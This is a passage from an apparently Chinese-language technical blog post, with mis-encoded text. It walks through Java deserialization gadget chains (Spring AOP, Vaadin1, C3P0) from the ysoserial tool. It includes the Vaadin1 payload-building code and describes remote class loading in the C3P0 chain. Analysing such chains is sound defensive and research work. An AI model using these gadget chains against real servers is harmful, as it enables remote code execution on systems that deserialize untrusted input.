class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JdkDynamicAopProxy</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    Object oldProxy = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">boolean</span> setProxyContext = <span class="keyword">false</span>;</span><br><span class="line">    TargetSource targetSource = <span class="keyword">this</span>.advised.targetSource;  <span class="comment">// </span></span><br><span class="line">    Class&lt;?&gt; targetClass = <span class="keyword">null</span>;</span><br><span class="line">    Object target = <span class="keyword">null</span>;</span><br><span class="line">    Object var13;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.equalsDefined &amp;&amp; AopUtils.isEqualsMethod(method)) &#123;</span><br><span class="line">            Boolean var18 = <span class="keyword">this</span>.equals(args[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> var18;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.hashCodeDefined &amp;&amp; AopUtils.isHashCodeMethod(method)) &#123;</span><br><span class="line">            Integer var17 = <span class="keyword">this</span>.hashCode();</span><br><span class="line">            <span class="keyword">return</span> var17;</span><br><span class="line">        &#125;</span><br><span class="line">        Object retVal;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.advised.opaque &amp;&amp; method.getDeclaringClass().isInterface() &amp;&amp; method.getDeclaringClass().isAssignableFrom(Advised.class)) &#123;</span><br><span class="line">            retVal = AopUtils.invokeJoinpointUsingReflection(<span class="keyword">this</span>.advised, method, args);</span><br><span class="line">            <span class="keyword">return</span> retVal;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.advised.exposeProxy) &#123;</span><br><span class="line">            oldProxy = AopContext.setCurrentProxy(proxy);</span><br><span class="line">            setProxyContext = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        target = targetSource.getTarget();  <span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (target != <span class="keyword">null</span>) &#123;</span><br><span class="line">            targetClass = target.getClass();</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Object&gt; chain = <span class="keyword">this</span>.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);</span><br><span class="line">        <span class="keyword">if</span> (chain.isEmpty()) &#123;</span><br><span class="line">            retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args); <span class="comment">// åå°„è°ƒç”¨å¯¹è±¡çš„ method æ–¹æ³•</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            MethodInvocation invocation = <span class="keyword">new</span> ReflectiveMethodInvocation(proxy, target, method, args, targetClass, chain);</span><br><span class="line">            retVal = invocation.proceed();</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt; returnType = method.getReturnType();</span><br><span class="line">        <span class="keyword">if</span> (retVal != <span class="keyword">null</span> &amp;&amp; retVal == target &amp;&amp; returnType.isInstance(proxy) &amp;&amp; !RawTargetAccess.class.isAssignableFrom(method.getDeclaringClass()))</span><br><span class="line">            retVal = proxy;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (retVal == <span class="keyword">null</span> &amp;&amp; returnType != Void.TYPE &amp;&amp; returnType.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AopInvocationException(<span class="string">&quot;Null return value from advice does not match primitive return type for: &quot;</span> + method);</span><br><span class="line">        &#125;</span><br><span class="line">        var13 = retVal; <span class="comment">// è¿”å›æ–¹æ³•</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (target != <span class="keyword">null</span> &amp;&amp; !targetSource.isStatic()) &#123;</span><br><span class="line">            targetSource.releaseTarget(target);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setProxyContext) &#123;</span><br><span class="line">            AopContext.setCurrentProxy(oldProxy);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> var13;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AopUtils</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeJoinpointUsingReflection</span><span class="params">(Object target, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectionUtils.makeAccessible(method);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(target, args); <span class="comment">// åå°„è°ƒç”¨</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var4.getTargetException();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AopInvocationException(<span class="string">&quot;AOP configuration seems to be invalid: tried calling method [&quot;</span> + method + <span class="string">&quot;] on target [&quot;</span> + target + <span class="string">&quot;]&quot;</span>, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AopInvocationException(<span class="string">&quot;Could not access method [&quot;</span> + method + <span class="string">&quot;]&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Vaddin1"><a href="#Vaddin1" class="headerlink" title="Vaddin1"></a>Vaddin1</h2><blockquote><p>Vaadin æ˜¯ Java Web åº”ç”¨å¼€å‘æ¡†æ¶ï¼Œç”¨ Java æˆ– TypeScript æ„å»ºå¯ä¼¸ç¼©çš„ UIï¼Œå¹¶ä½¿ç”¨é›†æˆçš„å·¥å…·ã€ç»„ä»¶å’Œè®¾è®¡ç³»ç»Ÿæ¥æ›´å¿«åœ°è¿­ä»£ã€æ›´å¥½åœ°è®¾è®¡å’Œç®€åŒ–å¼€å‘è¿‡ç¨‹ã€‚<br>CC2 + CC5<br>ä½¿ç”¨ TemplatesImpl æ‰¿è½½æ¶æ„ä»£ç <br>é€šè¿‡åŠ¨æ€ä»£ç† BadAttributeValueExpException çš„ååºåˆ—åŒ–è§¦å‘</p></blockquote><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">    BadAttributeValueExpException.readObject()</span><br><span class="line">        PropertysetItem.toString()</span><br><span class="line">                PropertysetItem.getPropertyId()</span><br><span class="line">                    NestedMethodProperty.getValue()</span><br><span class="line">                        TemplatesImpl.getObjectPropertyValue()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/MJvkQ7gFzd3eA4x.png" ><p>ysoserial.payloads.Vaadin1#getObject è¿”å›åŠ¨æ€ä»£ç† BadAttributeValueExpExceptionã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">(String command)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// æ„é€  TemplatesImpl æ‰¿è½½æ¶æ„æŒ‡ä»¤</span></span><br><span class="line">    Object templ = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å­˜å‚¨ Property å±æ€§å€¼</span></span><br><span class="line">    PropertysetItem pItem = <span class="keyword">new</span> PropertysetItem();        </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ„é€  NestedMethodProperty æ‰¿è½½ TemplatesImpl</span></span><br><span class="line">    NestedMethodProperty&lt;Object&gt; nmprop = <span class="keyword">new</span> NestedMethodProperty&lt;Object&gt;(templ, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    pItem.addItemProperty (<span class="string">&quot;outputProperties&quot;</span>, nmprop);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// åˆ©ç”¨ BadAttributeValueExpException çš„ val å­—æ®µæ‰¿è½½ PropertysetItem</span></span><br><span class="line">    BadAttributeValueExpException b = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    Reflections.setFieldValue (b, <span class="string">&quot;val&quot;</span>, pItem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BadAttributeValueExpException.readObject åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨å¯¹è±¡çš„ toString æ–¹æ³•ï¼Œè¿™é‡Œå³ PropertysetItem.toStringï¼Œè¿›ä¸€æ­¥è§¦å‘ NestedMethodProperty.getValue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BadAttributeValueExpException</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">&quot;val&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        val = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();    <span class="comment">// è°ƒç”¨å¯¹è±¡çš„ toString æ–¹æ³•</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PropertysetItem</span></span><br><span class="line"><span class="keyword">private</span> LinkedList&lt;Object&gt; list = <span class="keyword">new</span> LinkedList(); <span class="comment">// å­˜å‚¨id</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Property <span class="title">getItemProperty</span><span class="params">(Object id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (Property)<span class="keyword">this</span>.map.get(id);  <span class="comment">// è·å–å±æ€§</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String retValue = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    Iterator i = <span class="keyword">this</span>.getItemPropertyIds().iterator();</span><br><span class="line">    <span class="keyword">while</span>(i.hasNext()) &#123;    <span class="comment">// éå† id</span></span><br><span class="line">        Object propertyId = i.next();</span><br><span class="line">        retValue = retValue + <span class="keyword">this</span>.getItemProperty(propertyId).getValue <span class="comment">// è·å–æ˜ å°„çš„ Property å±æ€§å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ getValue æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">if</span> (i.hasNext()) &#123;</span><br><span class="line">            retValue = retValue + <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retValue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addItemProperty</span><span class="params">(Object id, Property property)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">&quot;Item property id can not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.map.containsKey(id)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.map.put(id, property); <span class="comment">// æ·»åŠ å±æ€§</span></span><br><span class="line">        <span class="keyword">this</span>.list.add(id);</span><br><span class="line">        <span class="keyword">this</span>.fireItemPropertySetChange();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NestedMethodProperty</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NestedMethodProperty</span><span class="params">(Object instance, String propertyName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.instance = instance;   <span class="comment">// å¯¹è±¡å®ä¾‹</span></span><br><span class="line">    <span class="keyword">this</span>.initialize(instance.getClass(), propertyName); <span class="comment">// å±æ€§å€¼</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> T <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object object = <span class="keyword">this</span>.instance;</span><br><span class="line">        Iterator var2 = <span class="keyword">this</span>.getMethods.iterator();</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!var2.hasNext()) &#123;</span><br><span class="line">                <span class="keyword">return</span> object;</span><br><span class="line">            &#125;</span><br><span class="line">            Method m = (Method)var2.next();</span><br><span class="line">            object = m.invoke(object);  <span class="comment">// åå°„è°ƒç”¨å°è£…å¯¹è±¡æŒ‡å®šå±æ€§çš„ getter æ–¹æ³•</span></span><br><span class="line">        &#125; <span class="keyword">while</span>(object != <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MethodException(<span class="keyword">this</span>, var4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h2><blockquote><p>C3P0 æ˜¯ä¸€ä¸ªå¼€æºçš„ JDBC è¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’Œ JNDI ç»‘å®šï¼Œæ”¯æŒ JDBC3 è§„èŒƒå’Œ JDBC2 çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰ Hibernateã€Spring ç­‰ã€‚</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>c3p0:0.9.5.2</li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">    PoolBackedDataSourceBase.readObject()</span><br><span class="line">        ReferenceIndirector.getObject()</span><br><span class="line">            ReferenceableUtils.referenceToObject()</span><br><span class="line">                Class.forName0()</span><br><span class="line">                    URLClassLoader.loadClass()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/mcCvQJ2HSIz7jFt.png" ><p>PoolBackedDataSourceBase ç±»ä¸­å‚¨å­˜äº† PropertyChangeSupport å’Œ VetoableChangeSupport å¯¹è±¡ï¼Œç”¨äºæ”¯æŒç›‘å¬å™¨çš„åŠŸèƒ½ã€‚</p><p>è¿™ä¸ªç±»åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶ï¼Œè¦ä¿å­˜å†…éƒ¨çš„ ConnectionPoolDataSource æˆå‘˜å˜é‡ï¼Œå¦‚æœ connectionPoolDataSource æœ¬èº«æ˜¯ä¸å¯åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œåˆ™ä½¿ç”¨ ReferenceIndirector å¯¹å…¶è¿›è¡Œå¼•ç”¨çš„å°è£…ï¼Œè¿”å›ä¸€ä¸ªå¯ä»¥è¢«åºåˆ—åŒ–çš„ IndirectlySerialized å®ä¾‹å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolBackedDataSourceBase</span> <span class="keyword">extends</span> <span class="title">IdentityTokenResolvable</span> <span class="keyword">implements</span> <span class="title">Referenceable</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> PropertyChangeSupport pcs = <span class="keyword">new</span> PropertyChangeSupport(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">protected</span> VetoableChangeSupport vcs = <span class="keyword">new</span> VetoableChangeSupport(<span class="keyword">this</span>);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream oos)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        oos.writeShort(<span class="number">1</span>);</span><br><span class="line">        ReferenceIndirector indirector;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SerializableUtils.toByteArray(<span class="keyword">this</span>.connectionPoolDataSource);</span><br><span class="line">            oos.writeObject(<span class="keyword">this</span>.connectionPoolDataSource); <span class="comment">// ä¿å­˜æˆå‘˜å˜é‡</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotSerializableException var9) &#123;   <span class="comment">// å¦‚æœè¯¥æˆå‘˜å˜é‡ä¸å¯åºåˆ—åŒ–</span></span><br><span class="line">            MLog.getLogger(<span class="keyword">this</span>.getClass()).log(MLevel.FINE, <span class="string">&quot;Direct serialization provoked a NotSerializableException! Trying indirect.&quot;</span>, var9);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                indirector = <span class="keyword">new</span> ReferenceIndirector(); <span class="comment">// ä½¿ç”¨ ReferenceIndirector å°è£…</span></span><br><span class="line">                oos.writeObject(indirector.indirectForm(<span class="keyword">this</span>.connectionPoolDataSource));    <span class="comment">// è¿”å› IndirectlySerialized</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var7;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;Problem indirectly serializing connectionPoolDataSource: &quot;</span> + var8.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>indirectForm æ–¹æ³•ä¸­è°ƒç”¨ä¼šè°ƒç”¨ ConnectionPoolDataSource çš„ getReference æ–¹æ³•è¿”å›ä¸€ä¸ª Reference å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨ ReferenceSerialized å¯¹è±¡å¯¹å…¶å°è£…ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> IndirectlySerialized <span class="title">indirectForm</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Reference var2 = ((Referenceable)var1).getReference();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ReferenceIndirector.ReferenceSerialized(var2, <span class="keyword">this</span>.name, <span class="keyword">this</span>.contextName, <span class="keyword">this</span>.environmentProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoolBackedDataSourceBase ç±»åœ¨ååºåˆ—åŒ–æ—¶ï¼Œè°ƒç”¨ IndirectlySerialized#getObject æ–¹æ³•é‡æ–°ç”Ÿæˆ ConnectionPoolDataSource å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">short</span> version = ois.readShort();</span><br><span class="line">    <span class="keyword">switch</span>(version) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Object o = ois.readObject();</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) &#123;</span><br><span class="line">            o = ((IndirectlySerialized)o).getObject();  <span class="comment">// è¿™é‡Œ</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.connectionPoolDataSource = (ConnectionPoolDataSource)o;</span><br><span class="line">        <span class="keyword">this</span>.dataSourceName = (String)ois.readObject();</span><br><span class="line">        o = ois.readObject();</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) &#123;</span><br><span class="line">            o = ((IndirectlySerialized)o).getObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.extensions = (Map)o;</span><br><span class="line">        <span class="keyword">this</span>.factoryClassLocation = (String)ois.readObject();</span><br><span class="line">        <span class="keyword">this</span>.identityToken = (String)ois.readObject();</span><br><span class="line">        <span class="keyword">this</span>.numHelperThreads = ois.readInt();</span><br><span class="line">        <span class="keyword">this</span>.pcs = <span class="keyword">new</span> PropertyChangeSupport(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.vcs = <span class="keyword">new</span> VetoableChangeSupport(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;Unsupported Serialized Version: &quot;</span> + version);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ReferenceSerialized#getObject è°ƒç”¨ InitialContext#lookup æ–¹æ³•å°è¯•ä½¿ç”¨ JNDI æ¥è·å–ç›¸åº”çš„å¯¹è±¡ï¼Œåœ¨ contextNameã€env å‡ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œåˆ™è°ƒç”¨ ReferenceableUtils.referenceToObject() ä½¿ç”¨ Reference ä¸­çš„ä¿¡æ¯æ¥è·å–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InitialContext var1;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.env == <span class="keyword">null</span>) &#123;</span><br><span class="line">            var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var1 = <span class="keyword">new</span> InitialContext(<span class="keyword">this</span>.env);</span><br><span class="line">        &#125;</span><br><span class="line">        Context var2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.contextName != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var2 = (Context)var1.lookup(<span class="keyword">this</span>.contextName);  <span class="comment">// JNDI è·å–å¯¹è±¡</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Reference è·å–å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">return</span> ReferenceableUtils.referenceToObject(<span class="keyword">this</span>.reference, <span class="keyword">this</span>.name, var2, <span class="keyword">this</span>.env);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ReferenceIndirector.logger.isLoggable(MLevel.WARNING)) &#123;</span><br><span class="line">            ReferenceIndirector.logger.log(MLevel.WARNING, <span class="string">&quot;Failed to acquire the Context necessary to lookup an Object.&quot;</span>, var3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Failed to acquire the Context necessary to lookup an Object: &quot;</span> + var3.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ReferenceableUtils#referenceToObject 